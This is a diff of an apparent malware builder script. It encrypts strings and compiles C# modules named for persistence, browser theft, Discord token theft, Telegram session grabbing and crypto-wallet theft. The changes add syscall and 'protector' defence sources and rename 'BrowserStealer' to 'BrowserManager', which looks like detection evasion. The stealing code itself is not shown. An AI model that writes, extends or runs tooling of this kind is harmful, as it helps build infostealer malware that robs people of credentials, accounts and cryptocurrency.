@@ -136,7 +136,7 @@ def encrypt_all_strings():
         print_step("Encrypting", f"{len(strings_to_encrypt)} strings...")
         for s in strings_to_encrypt:
             encrypted = encrypt_string(s)
-            print(f"    '{s}' -> decrypt_string('{encrypted}')")
+            print(f"    '{s}' -> '{encrypted}'")
 
         print_step("Complete", "All strings encrypted")
         return True
@@ -245,25 +245,29 @@ def compile_csharp():
         return False
 
     modules = [
-        ("defense", "SafetyManager.cs", "SafetyManager.dll", "/target:library /r:System.Security.dll /r:System.Management.dll"),
-        ("defense", "persist.cs", "persist.dll", "/target:library"),
-        ("native_modules", "BrowserStealer.cs", "BrowserStealer.dll", "/target:library /r:System.Security.dll /r:System.Web.Extensions.dll"),
-        ("native_modules", "discord.cs", "discord.dll", "/target:library /r:System.Security.dll"),
-        ("native_modules", "telegrab.cs", "telegrab.dll", "/target:library"),
-        ("native_modules", "system.cs", "system.dll", "/target:library /r:System.Management.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll"),
-        ("native_modules", "wallets.cs", "wallets.dll", "/target:library"),
-        ("native_modules", "bridge.cs", "bridge.dll", "/target:library")
+        ("defense", ["SafetyManager.cs", "SyscallManager.cs", "Protector.cs", "APIConstants.cs"], "SafetyManager.dll", "/target:library /r:System.Security.dll /r:System.Management.dll"),
+        ("defense", "persist.cs", "persist.dll", "/target:library /r:defense\\SafetyManager.dll"),
+        ("native_modules", "BrowserManager.cs", "BrowserManager.dll", "/target:library /r:System.Security.dll /r:defense\\SafetyManager.dll"),
+        ("native_modules", "discord.cs", "discord.dll", "/target:library /r:System.Security.dll /r:defense\\SafetyManager.dll"),
+        ("native_modules", "telegrab.cs", "telegrab.dll", "/target:library /r:defense\\SafetyManager.dll"),
+        ("native_modules", "system.cs", "system.dll", "/target:library /r:System.Management.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll /r:defense\\SafetyManager.dll"),
+        ("native_modules", "wallets.cs", "wallets.dll", "/target:library /r:defense\\SafetyManager.dll"),
+        ("native_modules", "bridge.cs", "bridge.dll", "/target:library /r:defense\\SafetyManager.dll")
     ]
 
     for folder, src, out, target in modules:
-        src_path = os.path.join(folder, src)
-        out_path = os.path.join("defense", out)
-        if not os.path.exists(src_path):
-            print_step(src, "❌ Source not found")
-            continue
+        if isinstance(src, list):
+            src_paths = [os.path.join(folder, s) for s in src]
+            label = ", ".join(src)
+        else:
+            src_paths = [os.path.join(folder, src)]
+            label = src
+            
+        out_path = os.path.join("bin", out)
+        if not os.path.exists("bin"): os.makedirs("bin")
         
-        print_step(src, f"Compiling to {out}...")
-        cmd = [CSC_PATH] + target.split() + [f"/out:{out_path}", src_path]
+        print_step(label, f"Compiling to {out}...")
+        cmd = [CSC_PATH] + target.split() + [f"/out:{out_path}"] + src_paths
         try:
             subprocess.run(cmd, check=True, capture_output=True)
             print_step(out, "✅ Done")
